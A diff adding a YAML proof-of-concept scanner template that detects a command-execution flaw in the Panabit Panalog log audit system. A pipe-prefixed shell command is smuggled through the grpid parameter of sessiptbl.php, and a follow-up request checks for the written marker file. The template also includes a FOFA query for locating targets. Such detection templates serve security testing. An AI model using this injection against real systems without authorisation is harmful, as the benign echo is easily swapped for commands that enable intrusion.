@@ -1,0 +1,21 @@
+id: poc-yaml-panalog-sessiptbl-rce
+info:
+  name: Panalog 日志审计系统 sessiptbl.php 命令执行漏洞
+  severity: critical
+  tags:
+  - rce
+  finger: Panabit Panalog
+  fofa: app="Panabit-Panalog"
+variables:
+  t1: random_int(100,1000)
+requests:
+- method: POST
+  path: /sessiptbl.php
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: action=serverdelay&grpid=|echo "vulnerability" >test{{.t1}}.txt
+  expression: "status_code == 200 && \ntrim(body) == \"\"\n"
+- method: GET
+  path: /test{{.t1}}.txt
+  expression: "status_code == 200 && \ntrim(body) == \"vulnerability\"\n"
+transport: http
